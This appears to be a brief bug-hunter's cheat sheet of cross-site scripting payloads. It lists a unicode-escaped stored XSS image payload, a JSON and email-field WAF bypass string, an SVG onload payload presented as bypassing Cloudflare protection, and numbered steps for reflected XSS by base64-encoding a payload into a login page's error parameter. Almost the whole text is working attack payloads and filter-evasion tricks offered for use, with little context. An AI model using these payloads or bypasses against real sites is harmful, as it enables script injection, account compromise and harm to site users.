## Stored XSS
\u003e\u003cimg src=1 onerror=alert(0)\u003e

## WAF bypasses in JASON
["');alert('XSS');//"]@xyz.xxx

## Cloudflare Protection Bypas
"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>

## Base64 Endcode
scenario:
1. visit the web target: redact[.]com/admin/login
2. login with wrong credential and you can see the link web application change to redact[.]com/admin/login?error= base64 here.
3. change the error massage to xss payload but you must endcode it first to base64
4. add your payload base64 and hit enter on that and boom rxss succesfully
